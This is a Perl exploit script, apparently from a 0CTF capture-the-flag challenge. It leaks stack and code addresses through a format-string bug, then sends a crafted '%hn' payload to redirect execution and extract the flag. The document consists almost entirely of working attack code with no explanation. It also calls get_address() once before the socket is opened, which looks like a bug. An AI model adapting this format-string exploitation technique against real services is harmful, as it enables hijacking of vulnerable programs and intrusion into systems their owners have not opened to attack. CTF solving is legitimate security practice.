#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

use constant {
    HOST => '127.0.0.1',
    #HOST => '202.112.26.107',
    PORT => 10910,
    READ_FLAG => 0xfb3,
    TEXT_OFFSET => 0xba0,
    STACK_OFFSET => 8
};

my ($addr_stack, $addr_code) = get_address();
my $buffer;
my $to_print;
my $sock;

$sock = IO::Socket::INET->new(PeerAddr => HOST,
				 PeerPort => PORT,
				 Proto => 'tcp') || die $@;

login();

($addr_stack, $addr_code) = get_address();
$buffer;
$to_print;

printf "[+] CODE: 0x%.16x\n", $addr_code;
printf "[+] STACK: 0x%.16x\n", $addr_stack;
$addr_code -= TEXT_OFFSET;
$addr_stack -= STACK_OFFSET;


$to_print = ($addr_code & 0xFFFF)+ READ_FLAG;
print "[+] $to_print chars to print\n";

$buffer = "%" . $to_print . "x-%33\$hn";
$buffer = $buffer . 
    "A"x(200-length($buffer)) . 
    pack("Q", $addr_stack) . 
    "\n\n";

print "[+] Send evil buffer\n";

print $sock $buffer;

while(my $l = <$sock>) {
    if($l =~ m/(0ctf\{.+\})/) {
	print "[+] FLAG : $1\n";
	last;
    }
}

sub login {
    print $sock
	"guest\n" .
	"guest123\n" .
	"2\n" .
	"A"x256 . "\n" .
	"4\n" .
	"-%lx"x70 . "\n";   
}

sub get_address {
    my ($addr_stack, $addr_code);

    while(my $l = <$sock>) {
	if($l =~ m/choice: Login: Password:/) {
	    $addr_stack = hex('0x' . (split(/-/, $l))[3]);
	    $addr_code  = hex('0x' . (split(/-/, $l))[61]);
	    last;
	    
	}
    }
    return ($addr_stack, $addr_code)
}
